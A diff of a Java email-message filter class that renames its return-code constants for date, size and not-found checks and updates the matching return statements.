@@ -45,11 +45,11 @@ public class Filter {
 
     static final int FILTERED_DISABLED = -1;
     static final int FILTERED_LASTCHECK = -2;
-    static final int FILTERED_FROM = -3;
-    static final int FILTERED_TO = -4;
+    static final int FILTERED_DATEFROM = -3;
+    static final int FILTERED_DATETO = -4;
     static final int FILTERED_SIZE = -5;
     static final int FILTERED_MESSAGE_ADDED = -6;
-    static final int FILTERED_FOUND = -7;
+    static final int FILTERED_NOTFOUND = -7;
     static final int FILTERED_INTERNAL = -8;
     static final int FILTERED_SENDMAIL = -9;
     static final int FILTERED_OK = 0;
@@ -262,7 +262,7 @@ public class Filter {
             debug.info("filterMessage: FILTERED_FOUND: " + folder.getName()
                     + " type: " + folder.getType());
             //#endif
-            return FILTERED_FOUND;
+            return FILTERED_NOTFOUND;
         }
 
         receivedTime = message.getReceivedDate().getTime();
@@ -279,7 +279,7 @@ public class Filter {
             //#ifdef DEBUG_INFO
             debug.info("doFilterFromDate: " + fromDate);
             //#endif
-            return FILTERED_FROM;
+            return FILTERED_DATEFROM;
         }
 
         // Se c'e' anche il filtro della data di fine e non viene rispettato
@@ -288,7 +288,7 @@ public class Filter {
             //#ifdef DEBUG_INFO
             debug.info("doFilterToDate: " + toDate);
             //#endif
-            return FILTERED_TO;
+            return FILTERED_DATETO;
         }
 
         if ((maxMessageSizeToLog > 0)
@@ -305,7 +305,6 @@ public class Filter {
     public final int filterMessage(final Message message)
             throws MessagingException {
         return filterMessage(message, 0);
-
     }
 
     /**
